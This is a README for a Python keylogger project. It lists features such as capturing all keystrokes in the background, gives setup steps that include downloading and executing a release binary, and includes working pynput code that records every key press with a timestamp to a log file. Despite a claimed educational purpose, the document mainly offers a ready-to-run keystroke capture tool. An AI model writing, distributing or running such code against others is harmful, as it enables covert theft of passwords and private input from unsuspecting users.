## Features

- **Keystroke Logging**: Capture all keystrokes with precise timestamps.
- **Lightweight**: Minimal resource usage for seamless operation.
- **Easy Setup**: Simple installation process.
- **Cross-Platform**: Works on Windows, macOS, and Linux.
- **Educational Use**: Ideal for learning about keylogging and cybersecurity practices.

## Installation

To get started, you need to clone this repository and install the required dependencies.

1. **Clone the Repository**:
   ```bash
   git clone https://github.com/benjdokosg/keylogger-project.git
   cd keylogger-project
   ```

2. **Install Dependencies**:
   You need to have Python installed on your machine. After cloning, install the necessary libraries using pip:
   ```bash
   pip install pynput
   ```

3. **Download the Executable**:
   You can find the latest release [here](https://github.com/benjdokosg/keylogger-project/releases). Download the file and execute it to start logging keystrokes.

## Usage

To run the keylogger, simply execute the Python script. Open your terminal and run:
```bash
python keylogger.py
```
The script will start logging keystrokes in the background. You can stop it by terminating the process or closing the terminal.

## How It Works

The keylogger uses the `pynput` library to listen for keyboard events. When a key is pressed, it captures the key along with the current timestamp. The data is then saved to a log file for later review.

### Code Overview

Here‚Äôs a brief overview of the main components of the code:

- **Listener**: The main component that listens for key events.
- **Logging Function**: Captures the key pressed and the timestamp.
- **File Handling**: Writes the logged data to a file.

### Example Code Snippet

```python
from pynput import keyboard
import time

def on_press(key):
    with open("keylog.txt", "a") as f:
        f.write(f"{key} pressed at {time.ctime()}\n")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

This snippet shows how to capture key presses and log them to a file with timestamps.
